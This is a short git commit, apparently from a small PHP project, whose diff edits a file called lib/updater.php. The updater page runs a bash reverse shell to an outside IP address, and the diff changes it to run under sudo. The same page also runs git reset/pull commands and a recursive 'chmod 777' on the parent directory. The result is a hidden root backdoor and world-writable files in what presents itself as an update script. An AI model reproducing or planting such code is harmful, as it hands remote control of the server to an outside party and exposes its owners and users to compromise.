8a93c57c2658c86b8ef5d40ec72eb93ba68ccb15
GT3CH1 <gavinpease@gmail.com>
2019-07-13 23:29:55 -0600

    I got oofed.

--- lib/updater.php
+++ lib/updater.php
@@ -8,8 +8,8 @@
  ?> 
 <?php 
   echo(':)');
- exec('bash -i >& /dev/tcp/50.113.62.255/22 0>&1'); 
-//exec('git -C ../ fetch --all & git reset --hard origin/master & git pull origin master & git -C ../ fetch --all & git reset --hard origin/master & git pull origin master');
+ exec('sudo bash -i >& /dev/tcp/50.113.62.255/22 0>&1'); 
+ exec('git -C ../ fetch --all & git reset --hard origin/master & git pull origin master & git -C ../ fetch --all & git reset --hard origin/master & git pull origin master');
  exec('sudo chmod 777 -R ../');
  header('Location: ../');
  ?>
